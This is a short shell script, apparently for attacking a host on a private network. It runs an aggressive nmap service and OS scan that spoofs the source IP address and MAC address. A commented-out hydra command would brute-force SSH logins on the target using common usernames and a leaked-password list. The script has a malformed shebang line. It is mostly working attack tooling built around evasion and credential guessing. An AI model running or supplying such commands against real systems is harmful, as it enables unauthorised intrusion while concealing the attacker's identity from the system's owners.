#/usr/bin/env sh
target=192.168.174.147
proxy=193.59.101.240 
#hydra -L top-usernames-shortlist.txt -P darkweb2017-top10000.txt $target ssh -V &
nmap -Pn -n -sV -A -v -S $proxy --spoof-mac intel -e ens33 -Pn $target &
